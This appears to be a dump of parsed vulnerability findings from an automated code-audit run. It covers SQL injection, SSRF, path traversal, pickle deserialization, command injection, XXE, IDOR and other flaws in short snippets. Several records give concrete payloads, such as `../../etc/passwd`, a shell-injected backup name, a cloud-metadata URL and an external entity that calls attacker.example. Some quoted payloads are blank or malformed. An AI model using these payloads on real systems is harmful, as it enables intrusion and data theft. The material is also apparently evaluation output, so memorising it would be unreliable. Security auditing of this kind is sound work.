parsed_findings.chain_steps: User-controlled `dir` (line 4) flows into the f-string SQL build (line 7) and is executed by `db.fetch_all(q)` (line 8).
parsed_findings.impact: Attackers may read unintended data, tamper with queries, or cause SQL errors/DoS depending on database and driver capabilities.
parsed_findings.proof: Supplying `dir=asc;--` makes the query include `ORDER BY name asc;--` instead of a safe direction value.
parsed_findings.repro_steps: Request the endpoint with `?sort=name&dir=asc;--` and observe SQL behavior/errors or altered results from `db.fetch_all(q)`.
parsed_findings.vuln_claim: Unvalidated `dir` from `request.args` is concatenated into the SQL `ORDER BY` clause, enabling SQL injection.

parsed_findings.chain_steps: Pivot by targeting internal endpoints or metadata URLs, then use the proxy response to extract secrets.
parsed_findings.impact: Attacker can access internal services (e.g., loopback/internal hosts/cloud metadata) and read sensitive responses through the proxy.
parsed_findings.proof: `const u=req.query.url||''` then `axios.get(u)` and returns `data.data` directly.
parsed_findings.repro_steps: Send `GET /fetch?url=http://127.0.0.1:8000/secret` to have the server fetch and return the response.
parsed_findings.vuln_claim: User-controlled `url` is fetched server-side via `axios.get(u)` without allowlisting, enabling SSRF and internal data exfiltration.

parsed_findings.chain_steps: Identify which check is intended, then bypass it to reach `axios.get(u)` with protected internal targets.
parsed_findings.impact: Validation bypass makes the SSRF reachable even if a block/allowlist was intended.
parsed_findings.proof: The `if (//api.partner.com')) {` condition is not a valid/complete allowlist check before `axios.get(u)`.
parsed_findings.repro_steps: Use a non-permitted domain/scheme (or malformed URL) and observe `200` with proxied content instead of `400 bad target`.
parsed_findings.vuln_claim: The attempted target validation/denylist check appears malformed, likely failing open and allowing arbitrary URLs.

parsed_findings.chain_steps: Query param influences `f`, then `path.join` resolves traversal path, then `fs.readFile` returns the file contents.
parsed_findings.impact: An attacker can read arbitrary server files, leading to sensitive data disclosure and potential follow-on exploits.
parsed_findings.proof: Using `?file=../../etc/passwd` turns `f` into `../etc/passwd`, so `path.join('/srv/data',f)` normalizes to `/srv/etc/passwd`.
parsed_findings.repro_steps: GET `/download?file=../../etc/passwd` and observe the response body includes contents from the targeted file path.
parsed_findings.vuln_claim: User-controlled `req.query.file` is sanitized with an insufficient `replace('../','')`, enabling directory traversal to escape `/srv/data`.

results.raw_output: {"skill_anchor":{"phase":"web","first_file":"01-prerequisites-and-environment.md"},"findings":[{"cwe":"CWE-22","file":"files.js","line_start":2,"line_end":7,"vuln_claim":"User-controlled `req.query.file` is sanitized with an insufficient `replace('../','')`, enabling directory traversal to escape `/srv/data`.","proof":"Using `?file=../../etc/passwd` turns `f` into `../etc/passwd`, so `path.join('/srv/data',f)` normalizes to `/srv/etc/passwd`.","repro_steps":"GET `/download?file=../../etc/passwd` and observe the response body includes contents from the targeted file path.","impact":"An attacker can read arbitrary server files, leading to sensitive data disclosure and potential follow-on exploits.","confidence":0.86,"chain_steps":"Query param influences `f`, then `path.join` resolves traversal path, then `fs.readFile` returns the file contents."}]}

parsed_findings.chain_steps: Cookie `state` -> base64 decode -> `pickle.loads` -> gadget execution -> RCE when `/resume` is called.
parsed_findings.impact: Leads to remote code execution under the app's privileges via malicious pickle gadget execution.
parsed_findings.proof: Attack-controlled `request.cookies['state']` reaches `pickle.loads(base64.b64decode(raw))` without validation or authentication.
parsed_findings.repro_steps: Set `state` cookie to a base64-encoded pickle payload containing a gadget chain, then request `/resume`.
parsed_findings.vuln_claim: Untrusted cookie data is base64-decoded then passed to `pickle.loads`, enabling arbitrary Python object deserialization.

parsed_findings.chain_steps: Invalid base64 in `state` -> exception in decode/load -> unhandled error -> 500 response (DoS risk).
parsed_findings.impact: Causes a 500 error (potential denial of service) and may leak stack traces depending on error settings.
parsed_findings.proof: No try/except surrounds `base64.b64decode(raw)` and `pickle.loads(...)`, so invalid input can raise an exception.
parsed_findings.repro_steps: Send `/resume` with `state=!!!!` (or truncated base64) to trigger a decoding/deserialization exception.
parsed_findings.vuln_claim: Malformed `state` cookie can crash request handling because base64 decoding/deserialization errors are not caught.

parsed_findings.chain_steps: Combine with mass assignment to escalate victim privileges (e.g., change support/admin flags) in the same request flow.
parsed_findings.impact: Attackers can modify other users’ accounts by directly targeting `:id`.
parsed_findings.proof: If the conditional does not correctly compare `req.user.id` to the target `:id`, any authenticated user may pass and update others.
parsed_findings.repro_steps: Send `PATCH /api/users/<victimId>` as a non-owner; observe `res.json({ok:true})` and changes persisted.
parsed_findings.vuln_claim: Authorization check appears incomplete/malformed, potentially allowing unauthorized PATCH access to arbitrary user IDs (IDOR).

parsed_findings.chain_steps: Mass assignment becomes account takeover when paired with the potentially broken authorization logic for cross-user updates.
parsed_findings.impact: Privilege escalation or integrity loss by overwriting fields that should be server-controlled.
parsed_findings.proof: An attacker can include privileged fields (e.g., `isSupport`) in `req.body`, which are written to the saved user record.
parsed_findings.repro_steps: Send `PATCH /api/users/<yourOrVictimId>` with JSON body like `{"isSupport":true}` and verify persistence after `db.users.save(user)`.
parsed_findings.vuln_claim: `Object.assign(user, req.body)` enables mass assignment of sensitive fields if request body contains protected properties.

parsed_findings.chain_steps: request.json -> f-string cmd -> os.system(cmd) -> shell metacharacters execute attacker commands.
parsed_findings.impact: Remote code execution in the web process context and possible sensitive file exfiltration via tar.
parsed_findings.proof: POST /backup JSON {"name":"x;id>/tmp/pwn","src":"/var/data/app"} builds cmd and executes attacker shell syntax.
parsed_findings.repro_steps: Send a POST to /backup with shell metacharacters in name or src, then observe command side effects.
parsed_findings.vuln_claim: Untrusted JSON fields are interpolated into a shell command executed by os.system, enabling command injection.

parsed_findings.chain_steps: src traversal payload -> weak startswith guard -> tar archives resolved target path outside /var/data/.
parsed_findings.impact: Arbitrary file inclusion into /tmp/{name}.tgz, enabling data disclosure.
parsed_findings.proof: POST /backup JSON {"src":"/var/data/../etc"} passes startswith('/var/data/') and tar can archive /etc.
parsed_findings.repro_steps: Use src containing '../' to traverse beyond /var/data/ while preserving the required prefix.
parsed_findings.vuln_claim: The '/var/data/' prefix check is bypassable with traversal sequences, letting tar read outside the intended directory.

parsed_findings.chain_steps: User input -> `markdown.markdown(body)` HTML passthrough -> `db.insert_comment({'html': rendered,...})` stores payload -> `db.all_comments()` returns it to clients -> client-side rendering executes script if not sanitized.
parsed_findings.impact: Arbitrary JavaScript execution can lead to session theft, CSRF via token reading, and full user account compromise.
parsed_findings.proof: Send a POST to `/comments` with JSON `{"body":""}` so `rendered=markdown.markdown(body)` preserves dangerous HTML for storage.
parsed_findings.repro_steps: 1) POST `/comments` with `body` containing `` (or ``) 2) GET `/comments` 3) the returned comment content can be executed by an unsafe HTML-rendering client.
parsed_findings.vuln_claim: Potential stored XSS exists because user-controlled markdown is converted to HTML and stored as `html` without sanitization.

parsed_findings.chain_steps: Set 'to' to a victim account id and iterate negative amounts to move funds.
parsed_findings.impact: Allows theft by crediting the caller and debiting arbitrary accounts without needing privilege escalation.
parsed_findings.proof: If amount=-100 and src is non-negative, the src < amt check (line 6) passes, then sender becomes src-amt (line 8 => src+100) and receiver becomes receiver+amt (line 9 => -100).
parsed_findings.repro_steps: POST /transfer with JSON {"to":"victim_id","amount":-100} as any authenticated user.
parsed_findings.vuln_claim: Endpoint allows negative 'amount' because it casts with int() and checks src < amt, enabling balance increases for the attacker and decreases for an arbitrary 'to'.

parsed_findings.chain_steps: Trigger the race repeatedly and adjust amt until the overdraft succeeds.
parsed_findings.impact: Enables overdraft/double-spend leading to account balance corruption.
parsed_findings.proof: Two parallel requests can both read the same src (line 5-6) before either write completes (line 8), causing both debits to apply.
parsed_findings.repro_steps: Send two simultaneous POST /transfer requests with amt close to src (both individually <= src) and observe sender balance drop below zero.
parsed_findings.vuln_claim: Non-atomic read-modify-write (get_balance then set_balance) can bypass the insufficient-funds check under concurrent requests.

parsed_findings.chain_steps: Forge JWT payload with wrong signature -> trigger verify failure -> obtain decoded payload -> bypass downstream auth checks.
parsed_findings.impact: If callers trust verifyToken output for authz, forged tokens can lead to authentication bypass or privilege escalation.
parsed_findings.proof: jwt.decode parses the token but does not validate its signature, so attacker-controlled claims can be returned.
parsed_findings.repro_steps: Send a request with a Bearer JWT whose signature is invalid; jwt.verify throws and the catch returns jwt.decode(t) in production.
parsed_findings.vuln_claim: In production, verification failures fall back to jwt.decode(t), returning an unverified JWT payload without signature validation.

parsed_findings.chain_steps: Because access is gated by a flawed condition, an attacker can target the special-case value that bypasses the check.
parsed_findings.impact: May expose a specific user's email due to broken access-control branching, potentially enabling unintended data access.
parsed_findings.proof: The route returns 403 when `uid` is truthy (non-zero) and otherwise executes the parameterized query at line 7.
parsed_findings.repro_steps: Authenticate and request `GET /u?id=0`; if a user with id=0 exists, the handler returns their `email`.
parsed_findings.vuln_claim: Authorization logic is inverted: `if uid` forbids all non-zero ids, unintentionally permitting DB access only for `id=0`.

parsed_findings.chain_steps: Use the timing leak to recover the correct HMAC digest, then submit signed payloads to execute `process_event(json.loads(body))`.
parsed_findings.impact: An attacker who can measure timing accurately could reduce the search space and eventually forge a valid webhook signature.
parsed_findings.proof: Because Python `==` may short-circuit on the first mismatching byte, response time can correlate with how many leading bytes match the correct HMAC.
parsed_findings.repro_steps: Send many POSTs to `/hook` with the same body but attacker-controlled `X-Sig` prefixes, then statistically compare response times to infer correct prefix bytes.
parsed_findings.vuln_claim: Webhook signature verification uses non-constant-time equality (`got == want`), enabling a timing side-channel to gradually guess valid HMACs.

parsed_findings.chain_steps: The check only enforces startswith('/') so protocol-relative //host bypasses and redirect(nxt) propagates it.
parsed_findings.impact: Enables phishing and social-engineering by redirecting victims to attacker-controlled domains.
parsed_findings.proof: Example: GET /go?next=//attacker.com causes a redirect Location of //attacker.com.
parsed_findings.repro_steps: Request /go?next=//attacker.com and confirm the HTTP Location header uses //attacker.com and the browser navigates off-site.
parsed_findings.vuln_claim: Open redirect via next allowing protocol-relative URLs (//attacker) to pass validation and be used as the redirect Location.

parsed_findings.chain_steps: resolve_entities=True causes entity resolution; no_network=False allows network fetches; fromstring parses attacker XML; external entity resolves and output is reflected in doc.findtext('title').
parsed_findings.impact: An attacker can trigger outbound requests (and possibly extract data) via external entity resolution, leading to SSRF/data exfiltration.
parsed_findings.proof: POST /xml/import with XML using an external entity (e.g., <!ENTITY xxe SYSTEM 'http://attacker.example/xxe'>) and referencing &xxe; inside <title>.
parsed_findings.repro_steps: Send body: <!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'http://attacker.example/xxe'>]><root><title>&xxe;</title></root> to /xml/import.
parsed_findings.vuln_claim: XXE is enabled by resolve_entities=True and no_network=False, letting attacker-supplied XML resolve external entities during parsing.

parsed_findings.chain_steps: Confirm the login-success response is inside the `if(true)` block and reachable with arbitrary input.
parsed_findings.impact: Attackers can obtain unauthorized access/account takeover by bypassing credential checks.
parsed_findings.proof: The snippet shows `if ( true )` which will always evaluate truthy, so credentials cannot gate the success path.
parsed_findings.repro_steps: POST `/login` with any `email`/`password` and verify the handler returns a successful login outcome despite wrong credentials.
parsed_findings.vuln_claim: Authentication logic appears bypassed because the condition is hardcoded `if(true)` before the login response path.

parsed_findings.chain_steps: Check whether `db.users.findOne` is Mongo-like and whether inputs are type-validated to strings before query execution.
parsed_findings.impact: Can bypass authentication or influence account lookup, potentially enabling user enumeration and account compromise.
parsed_findings.proof: If `email` is set to an object like `{"$ne":null}`, then `q` becomes `{email:{"$ne":null},password:<attacker>}` and may match unintended documents.
parsed_findings.repro_steps: Send `/login` with `email` set to a JSON object containing `$` operators and observe whether `db.users.findOne(q)` returns a user without correct credentials.
parsed_findings.vuln_claim: Directly mapping `req.body` fields into a database query object may enable NoSQL injection if the driver treats operator objects as selectors.

parsed_findings.chain_steps: Restrict egress with an allowlist and block private/loopback/link-local IPs (and DNS rebinding) before calling requests.get.
parsed_findings.impact: Enables access to internal services and potentially cloud metadata, leading to data/credential exposure.
parsed_findings.proof: Send POST /avatar/fetch with JSON {"url":"http://169.254.169.254/latest/meta-data/"}; the server will request that endpoint and return its byte size.
parsed_findings.repro_steps: 1) POST /avatar/fetch 2) body {"url":"http://127.0.0.1/"} 3) observe the server connects to the internal address.
parsed_findings.vuln_claim: SSRF via attacker-controlled URL: the server fetches arbitrary HTTP targets and reveals the result size.

parsed_findings.chain_steps: Use streaming (iter_content) with a strict byte limit and abort early on oversized responses; also enforce response/time limits.
parsed_findings.impact: May exhaust memory/bandwidth and reduce availability of the service.
parsed_findings.proof: Provide a URL that streams a very large response; the server loads it into data via requests.get(...).content and then computes len(data).
parsed_findings.repro_steps: 1) POST /avatar/fetch 2) body {"url":"http://attacker-controlled/large"} 3) observe high memory usage or degraded performance.
parsed_findings.vuln_claim: Potential DoS: the handler downloads the full response body into memory without any maximum size limit.

parsed_findings.chain_steps: Overflow `buf` past its bounds to overwrite saved frame/return addresses, then redirect execution to attacker-controlled code.
parsed_findings.impact: Stack buffer overflow can lead to denial of service and, with a crafted payload, arbitrary code execution.
parsed_findings.proof: Provide >64 bytes (e.g., 200 'A's) to corrupt the stack, typically crashing and potentially enabling control-flow hijack.
parsed_findings.repro_steps: Compile the program then run it and paste 200+ bytes at the `gets(buf)` prompt; confirm crash or altered execution.
parsed_findings.vuln_claim: Use of `gets(buf)` allows attacker-controlled input to overflow the 64-byte stack buffer and overwrite control data.

parsed_findings.chain_steps: Extract shared_prefs -> read access_token -> reuse token in Authorization headers to gain access.
parsed_findings.impact: An attacker can recover the access_token and impersonate the user to access protected APIs.
parsed_findings.proof: saveToken() persists the provided token using putString('access_token', token) in SharedPreferences('auth', MODE_PRIVATE).
parsed_findings.repro_steps: Call saveToken('attackerToken') and extract the app's shared_prefs XML to read access_token.
parsed_findings.vuln_claim: The access token is stored in plaintext SharedPreferences without encryption, enabling token theft from device storage.

results.raw_output: {"skill_anchor":{"phase":"mobile","first_file":"01-baseline-and-setup.md"},"findings":[{"cwe":"CWE-522","file":"SessionStore.kt","line_start":3,"line_end":4,"vuln_claim":"The access token is stored in plaintext SharedPreferences without encryption, enabling token theft from device storage.","proof":"saveToken() persists the provided token using putString('access_token', token) in SharedPreferences('auth', MODE_PRIVATE).","repro_steps":"Call saveToken('attackerToken') and extract the app's shared_prefs XML to read access_token.","impact":"An attacker can recover the access_token and impersonate the user to access protected APIs.","confidence":0.78,"chain_steps":"Extract shared_prefs -> read access_token -> reuse token in Authorization headers to gain access."}]}

parsed_findings.chain_steps: Obtain source/KEY -> decrypt iv||ct -> recover protected data.
parsed_findings.impact: All ciphertexts from this module become decryptable once KEY is known.
parsed_findings.proof: The KEY constant is directly present in crypto_util.py as fixed bytes.
parsed_findings.repro_steps: Copy KEY, parse stored ciphertext as iv||ct, then decrypt with AES-CBC to recover plaintext.
parsed_findings.vuln_claim: Hardcoded AES KEY enables key disclosure and universal decryption of all messages.

parsed_findings.chain_steps: Tamper iv||ct -> cause controlled plaintext changes or padding errors -> exploit to forge/recover.
parsed_findings.impact: Enables integrity bypass and potential secret recovery if the system reacts differently to padding errors.
parsed_findings.proof: enc() outputs only iv+ciphertext and adds no MAC/AEAD tag.
parsed_findings.repro_steps: Flip a bit in block n-1 of the ciphertext, then decrypt and verify the resulting plaintext corruption in block n.
parsed_findings.vuln_claim: AES-CBC is used without integrity protection, so ciphertext tampering can alter plaintext or trigger padding-oracle behavior.

parsed_findings.chain_steps: Supply a NULL `out` pointer (and nonzero `out_sz`) to trigger NULL dereference during the copy.
parsed_findings.impact: NULL pointer dereference leading to a denial of service (crash).
parsed_findings.proof: When `out` is NULL and `out_sz>0`, the condition is false, so line 5 executes `memcpy(out, in, n)` with a NULL destination.
parsed_findings.repro_steps: Call `copy_name("A", NULL, 2)` and observe a crash at/around `memcpy(out, in, n)` or `out[n]='\0'`.
parsed_findings.vuln_claim: Incorrect NULL check uses `if (out || out_sz == 0)`, so `out==NULL` with `out_sz>0` bypasses the guard and reaches `memcpy`.

results.raw_output: {"skill_anchor":{"phase":"pwn","first_file":"01-environment-baseline.md"},"findings":[{"cwe":"CWE-476","file":"safe_copy.c","line_start":3,"line_end":6,"vuln_claim":"Incorrect NULL check uses `if (out || out_sz == 0)`, so `out==NULL` with `out_sz>0` bypasses the guard and reaches `memcpy`.","proof":"When `out` is NULL and `out_sz>0`, the condition is false, so line 5 executes `memcpy(out, in, n)` with a NULL destination.","repro_steps":"Call `copy_name(\"A\", NULL, 2)` and observe a crash at/around `memcpy(out, in, n)` or `out[n]='\\0'`.","impact":"NULL pointer dereference leading to a denial of service (crash).","confidence":0.87,"chain_steps":"Supply a NULL `out` pointer (and nonzero `out_sz`) to trigger NULL dereference during the copy."}]}
